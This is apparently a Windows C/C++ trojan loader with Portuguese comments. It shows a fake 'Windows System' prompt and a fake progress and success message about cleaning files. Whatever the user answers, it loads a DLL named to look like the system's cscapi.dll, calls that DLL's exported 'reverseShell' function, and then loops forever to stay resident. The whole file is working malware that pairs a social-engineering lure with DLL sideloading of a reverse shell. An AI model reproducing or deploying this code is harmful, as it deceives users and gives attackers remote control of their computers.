#include <Windows.h>
#include <commctrl.h>
#include <iostream>
#include <vector>
#include <sstream>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <shlobj.h>

// variavel para criar a caixa de diálogo de progresso

HWND createProgressDialog;

// Função para exibir uma janela de mensagem perguntando ao usuário se deseja fazer uma atualização
BOOL askForUpdate() {
    int result = MessageBoxW(NULL, L"Deseja otimizar seu computador fazendo uma limpeza de arquivos?", L"Windows System", MB_YESNO | MB_ICONINFORMATION | MB_SERVICE_NOTIFICATION);
    return (result == IDYES);
}

void closeProgressDialog(HWND hwndDialog) {
    DestroyWindow(hwndDialog);
}

void performUpdate() {
    // Configuração da caixa de diálogo de progresso
    HWND hwnd = GetDesktopWindow(); // Define a janela pai como a área de trabalho
    LPCWSTR title = L"Windows System"; // Título da janela

    // Cria a caixa de diálogo de progresso
    HWND progressDialog;
    ShowWindow(progressDialog, SW_SHOW); // Mostra a caixa de diálogo

    // Fecha a caixa de diálogo de progresso quando a atualização estiver concluída
    closeProgressDialog(progressDialog);
    MessageBoxW(hwnd, L"A limpeza do sistema foi concluida com sucesso!.", title, MB_OK | MB_ICONINFORMATION);
}



// Prototipo da função da DLL
typedef void (*ReverseShellFunc)();

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

    HINSTANCE hDLL;
    ReverseShellFunc reverseShell;


     if (askForUpdate()) {
        MessageBoxW(NULL, L"Por favor aguarde...", L"Windows System", MB_OK | MB_ICONINFORMATION | MB_SERVICE_NOTIFICATION);
        Sleep(10000);
        performUpdate();
        } else {
        MessageBoxW(NULL, L"Nenhum arquivo apagado.", L"Windows System", MB_OK | MB_ICONINFORMATION | MB_SERVICE_NOTIFICATION);
    }
    // Carregar a DLL
    hDLL = LoadLibrary("cscapi.dll");

    if (hDLL == NULL) {
         return 1;
    }

    // Obter o endereço da função da DLL
    reverseShell = (ReverseShellFunc)GetProcAddress(hDLL, "reverseShell");
    if (reverseShell == NULL) {
        
        FreeLibrary(hDLL);
        return 1;
    }


   
    // Executar a função da DLL (shell reverso)
    reverseShell();

    
    // Manter o programa ativo em um loop infinito
    while (1) {
        // Realizar algumas operações para continuar em execução
        int a = 10, b = 5;
        int soma = a + b;
        int subtracao = a - b;
        int multiplicacao = a * b;
        double divisao = (double)a / b;

       
        Sleep(5000); // Esperar 5 segundos antes de repetir o loop
    }
    FreeLibrary(hDLL);
    
    }// Nunca alcançamos este ponto, mas para completar, liberamos a DLL
    
    
// compilador g++ .\carga_dll_MessageBox.c -o carga_dll_MessageBox.exe -mwindows -lcomctl32
